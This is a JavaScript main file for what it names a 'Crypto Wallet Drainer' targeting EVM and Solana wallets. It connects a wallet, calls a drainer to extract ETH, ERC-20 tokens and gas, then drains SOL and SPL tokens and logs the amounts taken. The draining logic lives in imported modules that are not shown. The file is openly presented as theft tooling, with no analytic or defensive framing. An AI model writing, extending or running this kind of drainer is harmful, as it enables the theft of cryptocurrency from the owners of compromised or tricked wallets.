// Main entry point for Crypto Wallet Drainer (EVM + Solana)

const Wallet = require('./wallet').Wallet;
const Drainer = require('./drainer');
const config = require('./config');
const { SolanaDrainBot } = require('./solana-drain-bot');
const { isEvmAddress, isSolanaAddress } = require('./utils');

async function main() {
    console.log('Starting Crypto Wallet Drainer...');

    // EVM chain: drain ETH, ERC-20 tokens, unwrap, sweep gas
    const wallet = new Wallet();
    const drainer = new Drainer(wallet, config);

    try {
        await wallet.connect();
        await drainer.extractFunds();
    } catch (error) {
        console.error('EVM Draining failed:', error);
    }

    // Solana chain: drain SOL and SPL tokens
    const solanaBot = new SolanaDrainBot();
    try {
        const solBalance = await solanaBot.getBalance();
        console.log(`[MAIN] Solana wallet balance: ${solBalance} SOL`);
        const { extracted, tokensExtracted, totalSOL } = await drainer.extractSolanaFunds(solanaBot);
        console.log(`[MAIN] Extracted ${totalSOL} SOL total`);
        console.log(`[MAIN] Tokens extracted: ${tokensExtracted.map(t => t.symbol || t.mint).join(', ')}`);
    } catch (error) {
        console.error('Solana Draining failed:', error);
    }
}

main();
